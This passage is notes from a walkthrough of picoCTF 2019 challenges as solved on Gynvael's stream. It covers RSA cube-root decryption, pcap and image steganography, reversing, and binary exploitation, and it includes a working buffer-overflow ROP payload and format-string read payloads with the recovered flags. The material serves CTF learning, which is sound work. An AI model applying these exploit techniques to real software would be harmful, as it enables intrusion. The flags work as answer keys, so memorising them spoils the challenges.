If the ciphertext is short and e is small, than you can run root e on the ciphertext.   

Since `Ciphertext = m^e mod N`, if e is small then it's possible that the following condition is true `m^e < N`. If `m^e < N` is true, then the mod N basically has no effect, so essentially `ciphertext = m^e`. So you can get m by doing root e of ciphertext.  

Use python
```python
e = 3

c = 2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125

a = pow(c, 1/e)
b = hex(int(a))[2:]

p = bytes.fromhex(b)

print(p)
```

```console
$ python3 a.py
b'picoCS\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
```

It sort of works. Python's pow method uses doubles when doing a root so we lose some precision which is why it doesn't work all the way.  

```python
import gmpy2

e = 3

c = 2205316413931134031074603746928247799030155221252519872650101242908540609117693035883827878696406295617513907962419726541451312273821810017858485722109359971259158071688912076249144203043097720816270550387459717116098817458584146690177125

a, _ = gmpy2.iroot(c, e)

print(bytes.fromhex(hex(a)[2:]))
```

```console
$ python3 a.py
b'picoCTF{n33d_a_lArg3r_e_ff7cfba1}'
```

If you wanted to implement the above on your own you would try solving the following equation: `c - m ** e = 0` in a programmatic way (called bisection).

Lack of padding is also something wrong with the ciphertext.  

## mus1c - General Skills
Looks like an esoteric programming language challenge.  

[Rockstar programming language](https://github.com/RockstarLang/rockstar).  

Gynvael uses [this](https://palfrey.github.io/maiden/) Rockstar to Rust online interpreter first, but it doesn't seem to parse everything correctly.  

Gynvael tries the official [compiler](https://codewithrockstar.com/online/) instead.  

We get the following output:
```
114
114
114
111
99
107
110
114
110
48
49
49
51
114
Program completed in 195 ms
```

Use python to convert it to ascii
```python
a = """114
114
114
111
99
107
110
114
110
48
49
49
51
114
"""

''.join([chr(int(x)) for x in a.split("\n") if x])
```

## shark on the wire 2 - Forensics
Lots of red herrings that Gynvael spent time on. Gynvael tries a lot of approaches.    

Gynvael uses network miner, doesn't find too much.

Use strings
```console
$ strings capture.pcap | grep "picoCTF"
picoCTF Sure is fun!CmP]2
I really want to find some picoCTF flagsEmP]m=
picoCTF Sure is fun!ImP]
I really want to find some picoCTF flagsKmP]
picoCTF Sure is fun!OmP]
I really want to find some picoCTF flagsQmP]
picoCTF Sure is fun!VmP]\V
I really want to find some picoCTF flagsXmP]
picoCTF Sure is fun!\mP]
I really want to find some picoCTF flags^mP]
picoCTF Sure is fun!bmP]I
I really want to find some picoCTF flagsdmP]
picoCTF Sure is fun!hmP]
I really want to find some picoCTF flagskmP]
picoCTF Sure is fun!omP]
I really want to find some picoCTF flagsqmP]}
picoCTF Sure is fun!umP]
I really want to find some picoCTF flagswmP]
```

Use wireshark to look for that pico string. Gynvael notices that for UDP packets of length 1, there seems to be a character being sent. It looks like they're being sent to different hosts. Gynvael finds a fake flag on one of the hosts and decides to filter by destination ip 10.0.0.12 using the `data.len==1 and ip.dst == 10.0.0.12` filter. However, it seems like some of the packets are sent from different sources, so he thinks the flag is split between different streams.  

Different approach: filter by `data.len ==1`. File-> Export Packet Dissection as Json (only displayed packets, Packet bytes, all expanded).
Use python:
```python
import json

with open("asdf.json", "r") as f:
  d = json.load(f)
for p in d:
  a = p["_source"]["layers"]["data"]["data.data"]
  src = p["_source"]["layers"]["ip"]["ip.src"]
  dst = p["_source"]["layers"]["ip"]["ip.dst"]

  s = str(bytes.fromhex(a))

  print (src, dst, s)

```
This just dumps the data and the src and dst ip.

This doesn't really get us anywhere. Gynvael tries sorting by destination ip and source ip but gets nowhere.  
```python
import json

with open("asdf.json", "r") as f:
  d = json.load(f)

ip_src = {}
ip_dst = {}

for p in d:
  a = p["_source"]["layers"]["data"]["data.data"] # Get data
  src = p["_source"]["layers"]["ip"]["ip.src"] # Get src ips
  dst = p["_source"]["layers"]["ip"]["ip.dst"] # Get destination ips

  a = a.replace(":", "")
  s = str(bytes.fromhex(a), "ascii")

  # Sorts data based on ip src
  if src in ip_src:
    ip_src[src] += s
  else:
    ip_src[src] = s

  # Sorts data based on ip dst
  if dst in ip_dst:
    ip_dst[dst] += s
  else:
    ip_dst[dst] = s

# Prints data based on source IP
for k, v in ip_src.items():
  print(k, v)

# Prints data based on destination IP
for k, v in ip_dst.items():
  print(k, v)

```

Instead of filtering by data.len of 1, just filter out any non udp traffic: `udp and not mdns and not ssdp and not llmnr`. Export data as before and save as json. Gynvael thinks the last number of some source IP addresses are ascii characters that will make up the flag. For example some IP addresses are 10.0.0.66. 66 could be ascii 'B'.  

Use python to get the source IP addreses of the packets and see if the last decimal is ascii. If it is ascii then combine the chars to make a flag:
```python
import json

flag = ""

with open("asdf.json", "r") as f:
  d = json.load(f)

ip_src = {}
ip_dst = {}

for p in d:
  # Not all packets have data, so use try and except to filter out the packets without data
  try:
    a = p["_source"]["layers"]["data"]["data.data"] # Get data
    src = p["_source"]["layers"]["ip"]["ip.src"] # Get src ips
    dst = p["_source"]["layers"]["ip"]["ip.dst"] # Get destination ips
  except KeyError:
    continue

  a = a.replace(":", "")
  s = str(bytes.fromhex(a), "ascii")

  # Take the src address and take the last part
  x = int(src.split('.')[-1])

  # See if the last part of the src ip is actually within the ascii range
  if 32 < x < 127:
    flag += chr(x) # Add the character


print(flag)
```

```console
$ python3 go.py
ddddddddddddddddddddddddddddddBBKKKKKBBBBBBBBBBBBBKKKKKBBBKKBKBBCBBBBBeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeBBBBKKKBBKKKKBBPOONMMKdn
```
This doesn't seem to be the flag, so the aproach above is probably wrong.

New idea. Some of the ports are weird. Some ports are like 5112 or like 5097. If we get rid of the 5, we can get 112 or 97, which are ascii printable. Let's take all the packets with udp ports greater than 5000 and then get rid of the 5. Then we can try converting the ports-5000 to ascii printable characters to see if the characters will form the flag:
```python
import json

flag = ""

with open("asdf.json", "r") as f:
  d = json.load(f)

ip_src = {}
ip_dst = {}

for p in d:
  # Not all packets have data, so use try and except to filter out the packets without data
  try:
    a = p["_source"]["layers"]["data"]["data.data"] # Get data
    src = p["_source"]["layers"]["ip"]["ip.src"] # Get src ips
    dst = p["_source"]["layers"]["ip"]["ip.dst"] # Get destination ips
  except KeyError:
    continue

  a = a.replace(":", "")
  s = str(bytes.fromhex(a), "ascii")

  # Take the src address and take the last part
  x = int(src.split('.')[-1])

  # See if the last part of the src ip is actually within the ascii range
  if 32 < x < 127:
    port = int(p["_source"]["layers"]["udp"]["udp.srcport"])
    if port > 5000:
      print(port)
      flag += chr(port - 5000)


print(flag)
```

```console
$ python3 go.py
...
5097
5048
5125
5097
5097
5097
5097
5097
5097
5097
5097
paaaaaicoCTF{p1LLf3aaaaar3daa_adaata_v1a_staaa3gaaaa0}aaaaaaaa
```
The above ouput looks very close to the flag, except that it has a bunch of a's. Let's just get rid of the a's.
```python
import json

flag = ""

with open("asdf.json", "r") as f:
  d = json.load(f)

ip_src = {}
ip_dst = {}

for p in d:
  # Not all packets have data, so use try and except to filter out the packets without data
  try:
    a = p["_source"]["layers"]["data"]["data.data"] # Get data
    src = p["_source"]["layers"]["ip"]["ip.src"] # Get src ips
    dst = p["_source"]["layers"]["ip"]["ip.dst"] # Get destination ips
  except KeyError:
    continue

  a = a.replace(":", "")
  s = str(bytes.fromhex(a), "ascii")

  # Take the src address and take the last part
  x = int(src.split('.')[-1])

  # See if the last part of the src ip is actually within the ascii range
  if 32 < x < 127:
    port = int(p["_source"]["layers"]["udp"]["udp.srcport"])
    if port > 5000:
      print(port)
      flag += chr(port - 5000)

print(flag)
print(flag.replace("a", ""))
```

```console
$ python3 go.py
...
5097
5048
5125
5097
5097
5097
5097
5097
5097
5097
5097
paaaaaicoCTF{p1LLf3aaaaar3daa_adaata_v1a_staaa3gaaaa0}aaaaaaaa
picoCTF{p1LLf3r3d_dt_v1_st3g0}
```

When we submit `picoCTF{p1LLf3r3d_dt_v1_st3g0}` as the flag, it seems to be incorrect. We probably removed too many a's. With a bit of guesing we figure out that that the `dt` part of the flag should be `data` and that `v1` should be `v1a` (via), which makes the actual flag `picoCTF{p1LLf3r3d_data_v1a_st3g0}`.

## leap-frog - Binary Exploitation
```console
$ checksec --file ./rop
[*] '/problems/leap-frog_0_b02581eeadf3f35f4356e23db08bddf9/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
NX enabled means stack is writeable but not executable and No PIE means no ASLR.  

gets() is still the vulnerable code in vuln(). This means we can still use \x00 bytes.  

Our goal is to execute the display_flag() function:
```c
void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }

  fgets(flag, sizeof(flag), file);

  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  }
  else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  }
  else {
    printf("You won't get the flag that easy..\n");
  }
}
```


It looks like it looks to see if these global variables are set (non-zero):
```c
bool win1 = false;
bool win2 = false;
bool win3 = false;
```

These functions are provided to set the above variables, but we don't have to use them:
```c
void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }
  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  }
  else {
    printf("Nope. Try a little bit harder.\n");
  }
}
```

Setting arguments is boring according to Gynvael, so he wants to use gets() on the address of win1 to set all 3 global variables since they are adjacent to each other in memory. Then we can just call the display_flag() function. If we look at the assembly we see that ` test   %al,%al` is used to check the global variables. This only tests to make sure the global vars are non zero, so we can use any non zero value to overwrite the 3 global variables.  

Find the address of gets() using IDA or objdump or Ghidra.
```console
$ objdump -d ./rop
...
08048430 <gets@plt>:
...
080486b3 <display_flag>:
...
```

The address of gets is 0x08048430. The address of display_flag is 0x080486b3. Gynvael uses IDA to look for the address of win1, but you can use gdb as well:
```console
$ gdb ./rop
(gdb) p &win1
$1 = (<data variable, no debug info> *) 0x804a03d <win1>
```

So 0x804a03d is the address of win1.   

Let's look at the assembly for vuln() so we know what the stack will look like after the gets() call (you can use objdump or IDA like Gynvael does)
```assembly
08048791 <vuln>:
 8048791:       55                      push   %ebp
 8048792:       89 e5                   mov    %esp,%ebp
 8048794:       53                      push   %ebx
 8048795:       83 ec 14                sub    $0x14,%esp
 8048798:       e8 83 fd ff ff          call   8048520 <__x86.get_pc_thunk.bx>
 804879d:       81 c3 63 18 00 00       add    $0x1863,%ebx
 80487a3:       83 ec 0c                sub    $0xc,%esp
 80487a6:       8d 83 7b e9 ff ff       lea    -0x1685(%ebx),%eax
 80487ac:       50                      push   %eax
 80487ad:       e8 6e fc ff ff          call   8048420 <printf@plt>
 80487b2:       83 c4 10                add    $0x10,%esp
 80487b5:       83 ec 0c                sub    $0xc,%esp
 80487b8:       8d 45 e8                lea    -0x18(%ebp),%eax
 80487bb:       50                      push   %eax
 80487bc:       e8 6f fc ff ff          call   8048430 <gets@plt>
 80487c1:       83 c4 10                add    $0x10,%esp
 80487c4:       8b 5d fc                mov    -0x4(%ebp),%ebx
 80487c7:       c9                      leave
 80487c8:       c3                      ret
 ```

Here is what we want the stack to look like:
[ buf buffer + other stuff ]
[    address of gets()     ] # When ret is called when vuln() returns, this address will be popped off the stack
[ address of display_flag()] # This is what is popped into eip after and executed after gets() returns
[    address of  win1      ] # This is the argument of gets()

Here's the exploit:

`\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n # New lines are so that get stops getting input`

We need some padding to overflow the buffer (Gynvael uses IDA to look at the stack and determine the amount needed):
`AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n`

Use echo to send it to the binary:
```console
$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' # -e is for interpreting the \x and the -n is to omit new line
```

Get the flag:
```
$ echo -e -n 'AAAAAAAAAAAAAAAABBBBCCCCDDDD\x30\x84\x04\x08\xb3\x86\x04\x08\x3d\xa0\x04\x08\nABC\n' | ./rop
Enter your input> picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_8783895b}
Segmentation fault (core dumped)
```

If we wanted to do it "properly", we would first put the address of leapA(), then the middle of leap3(), then leap2() with the right arguments and bytes (since there will be pop ebp instructions). Since leap3 has a `mov ebx, ebp + 4`, we would just have to put an address that is actually readable so the program doesn't crash.  

A viewer asked if it's possible to jump to directly into the display_flag(). It might be possible since the program stores the flag in memory even before it checks if the win vars were set. However, it probably would be difficult due to a few reasons. One is that ASLR still affects the stack, just not the binary.

## reverse_cipher - Reverse Engineering
We get a file and a x64 binary. The rev file contains part of the flag:
```console
$ less rev_this
picoCTF{w1{1wq83k055j5f}
rev_this (END)
$ file rev
rev: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=523d51973c11197605c76f84d4afb0fe9e59338c, not stripped
```

Gynvael uses IDA to look at at the binary and sees that it appends to the rev_this file.

Part of the decompilation (using Ghidra since I don't have IDA):
```c
local_20 = fopen("flag.txt","r");
local_28 = fopen("rev_this","a");
if (local_20 == (FILE *)0x0) {
  puts("No flag found, please make sure this is run on the server");
}
if (local_28 == (FILE *)0x0) {
  puts("please run this on the server");
}
```

Reads 24 bytes or 0x18 bytes
```c
sVar1 = fread(local_58,0x18,1,local_20)
```

Just copies first 8 bytes
```c
local_10 = 0;
while (local_10 < 8) {
  local_9 = local_58[local_10];
  fputc((int)local_9,local_28);
  local_10 = local_10 + 1;
}
```

The following just checks whether the index is even or odd. If it's odd it decrements by 2 and if it's even it adds 5. Do this for the rest of the bytes in flag:
```c
local_14 = 8;
while ((int)local_14 < 0x17) {
  if ((local_14 & 1) == 0) {
    local_9 = local_58[(int)local_14] + '\x05';
  }
  else {
    local_9 = local_58[(int)local_14] + -2;
  }
  fputc((int)local_9,local_28);
  local_14 = local_14 + 1;
}
```

Use python to reverse the operations above (add instead of subtract, subtract instead of add):
```c
d = bytearray(open("rev_this", "rb").read())

for i in range(8, 23):
  if i % 2 == 0:
    d[i] -= 5
  else:
    d[i] += 2

print(d)
```

```console
$ python3 asdf.py
bytearray(b'picoCTF{r3v3rs35f207e7a}')
```

## stringzz - Binary Exploitation
```console
$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   80 Symbols   
$ file vuln
vuln: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=a716593e6e1b674f3f5c310077ba3da3fae42650, not stripped    
```

All protections are enabled :) 

Source:
```c
int main (int argc, char **argv)
{
    puts("input whatever string you want; then it will be printed back:\n");
    int read;
    unsigned int len;
    char *input = NULL;
    getline(&input, &len, stdin);
    //There is no win function, but the flag is wandering in the memory!
    char * buf = malloc(sizeof(char)*FLAG_BUFFER);
    FILE *f = fopen("flag.txt","r");
    fgets(buf,FLAG_BUFFER,f);
    printMessage1(input); // Basicallly printf(input);
    fflush(stdout);
}
```

`printMessage1(input);` basically calls printf(input) which is the format string bug. In order to be able to exploit the format string vulnerability, you need to be able to control the format string (`input` in this case) and also the stack after `input`.  

Some handy format strings for exploitation:
`%7$s` takes the 7th item on the stack and reads from that address
`%n` writes an int
`%hn` writes a short
`%hhn` writes a byte
You write the number of outputted bytes using the %n above.

E.g. `printf("AAAA%n", asdf)` would write 4 bytes to asdf  

This line of code puts the address of the flag onto the stack which fulfills the requirement listed above.
```c
char * buf = malloc(sizeof(char)*FLAG_BUFFER);
``` 

Let's test the program:
```console
$ echo '%x' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

a
```
Since `a` is printed out, it means that there was a decimal 10 somewhere on the stack. This shows us that there is indeed a format string vulnerability in the program.  

This tries to read from the first thing on the stack. It crashes because the program is trying to read from address 0xa.
```console
$ echo '%1$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

Segmentation fault (core dumped)
```

Now we can just incrementing the 1 in `'%1$s'` until we find the location of the flag.
```console
$ echo '%2$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

Ǖ
$ echo '%3$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

û
$ echo '%4$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

lM
echo '$%5$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:


```
and so on...  

Gynvael keeps doing this until he gets to 37:
```console
$ echo '%37$s' | ./vuln
input whatever string you want; then it will be printed back:

Now
your input
will be printed:

picoCTF{str1nG_CH3353_0814bc7c}
```

If you needed to, you could probably just script it to make it faster.  

## Investigative Reversing 1 - Forensics
If you look at the ends of the 3 pngs given, you'll notice that there seems to be parts of the flag at the end of the file.  

PNGs are encoded in chunks which contain the size, name, and checksum of the chunks. At the end of the PNGs, each PNG has a chunk ending in the the same checksum: `AE 42 60 82`. So anything after these bytes are part of the flag. Here are the ending bytes from each of PNGs:  

mystery.png: `CF{An1_37d24ffd}`  
mystery1.png: 0x85 0x73  
mystery2.png: `icT0tha_`  

Now open the binary in IDA (or ghidra) and decompile:

Opens the files:
```c
  stream = fopen("flag.txt","r");
  f = fopen("mystery.png","a");
  g = fopen("mystery2.png","a");
  h = fopen("mystery3.png","a");
```

Reads the flag.txt:
```c
fread(local_38,0x1a,1,stream);
```

The following just takes three chars of the flag and output into h, or mystery3.png:
```c
fputc((int)local_38[1],h);
...
fputc((int)local_38[2],h);
...
fputc((int)local_33,h);
...
```

Then this takes chars from 10 to 14 and put it in h (mystery3.png)
```c
local_64 = 10;
while (local_64 < 0xf) {
  fputc((int)local_38[local_64],h);
  local_64 = local_64 + 1;
}
```
That means `0tha_` are the 10th to 14th chars from flag.txt.  

The flag should look something like this:
`picoCTF{AAAAAAAAAAAAAAAAAAAAAAAAA}` where the A's are just placeholder characters.  

Now that we know that `0tha_` is from index 10 to 15, then we can replace the A's to form the following:
```picoCTF{AA0tha_AAAAAAAAAA}```

This takes characters from index 6 to 9 from flag.txt and writes to f (mystery.png):
```c
local_68 = 6;
while (local_68 < 10) {
  local_6b = local_6b + '\x01';
  fputc((int)local_38[local_68],f);
  local_68 = local_68 + 1;
}
```

That means that the chars from above would look something like `F{AA` which matches closely with `F{An` from mystery.png. So we combine that with what we have already for the flag:
```
picoCTF{An0tha_AAAAAAAAAA}
```

This goes from 15 to the end of the flag and appends it to the end of f (mystery.png):
```c
local_60 = 0xf;
while (local_60 < 0x1a) {
  fputc((int)local_38[local_60],f);
  local_60 = local_60 + 1;
}
```
So we know that `1_37d24ffd}` is from 15 to the end of the flag. When we combine it we get this:
```
picoCTF{An0tha_1_37d24ffd}
```
And there's the flag.

## pastaAAA - Forensics
We get a PNG of some pasta. Gynvael notices that there is some weird banding (gradients that are not smooth color transitions) on the right side of the image, which means there's something weird that happened.  

Looking in a hexeditor shows that there are normal headers and the end is normal.   

A good technique Gynvael recommends is to run a reverse image search on the image for CTFs to see if you can find the original image. The first search image doesn't work too well (image.google.com). But [https://tineye.com] is a search engine that looks for images that look identical to the one that you give. He finds that the image is just a stock image and so it doesn't look like the reverse image search won't do any good for this challenge.  

When inspecting the image a second time, Gynvael notices a 'p' towards the left of the image. The challenge is more of a steganography challenge rather than a file format challenge.  

Open up the image in GIMP and do some "Image magic."  

Colors -> Curves. Notice that the image is highly segmented. We see some letters, but we can't seem to get the full flag.  

Use GIMP to save the png as a .raw (planar).

Use python to try separating the bit planes:
```python
d = bytearray(open("ctf.raw", "rb").read())

a = []

# Make 8 copies in a bytearray
for _ in range(8):
  a.append(bytearray(len(d)))


for i, byte in enumerate(d):
  for j in range(8):
    bit = ((byte >> j) & 1) # Extract a bit
    a[j][i] = bit * 255

for i in range(8):
  with open("plane%i.raw" % i, "wb") as f:
    f.write(a[i])
```

```console
$ python3 go.py
$ ls
ctf.png  ctf.raw  go.py  plane0.raw  plane1.raw  plane2.raw  plane3.raw  plane4.raw  plane5.raw  plane6.raw  plane7.raw
```

Open the raw image as planar 24 bpp (3 bytes per pixel) as a 826x620 image. The bottom 3 planes seem to contain the flag. Change the script to only get the bottom 3 planes and combine them:
```python
d = bytearray(open("ctf.raw", "rb").read())

a = []

# Make 8 copies in a bytearray
for _ in range(8):
  a.append(bytearray(len(d)))


for i, byte in enumerate(d):
  for j in range(3):
    bit = ((byte >> j) & 1) # Extract a bit
    a[0][i] |= bit << (j + 5)

# for i in range(8):
#   with open("plane%i.raw" % i, "wb") as f:
#     f.write(a[i])
with open("output.raw", "wb") as f:
  f.write(a[0])
```

Open the output.raw file (Gynvael seems to use [IrfanView](https://www.irfanview.com)).  

In this steganography challenge, data was hidden in the least 3 significant bits. The banding we saw earlier was because the detail was lost with the removal of these 3 bottom bits per pixel.

## Random other stuff Gynvael says about solving ctf challenges during the stream
* He recommends kaitai struct for stegno challenges (Part 1: 46:39)
* Recommends pdfstreamdumper
* Thumbnails can store info
* For network dumps there are two main tools: Wireshark and NetworkMiner
* Gynvael recommends working on ctf challenges remotely in most cases since in many cases an exploit could work locally but not remotely (like in the above case).
* On 64-bit binary exploitation challenges, when passing parameters to functions, ROP is usually the way to get the proper values into registers.
* calling exit() still means the destructors are still called. An attacker can use the destructor call to their advantage. Use \_exit instead with the underscore.
* In part 5, Gynvael mentions a security bug called Http parameter pollution. While looking at JSON data, Gynvael points out how when there are keys with the same name, then there could be a security bug since some parsers might just return the first key-value pair while another parser might return the second key-value pair.
* According to Gynvael there are only certain operations used for standard reverse engineering challenges:
  1. add sub
  2. rol ror (rotate bits (not same as shift))
  3. xor
* `FILE *f = fopen("flag.txt","r");` can make a the flag appear in a buffer in libc. There's a buffer for a given file in libc.


## TODO 
* Fix all the weird non ascii apostrophes and double quotes
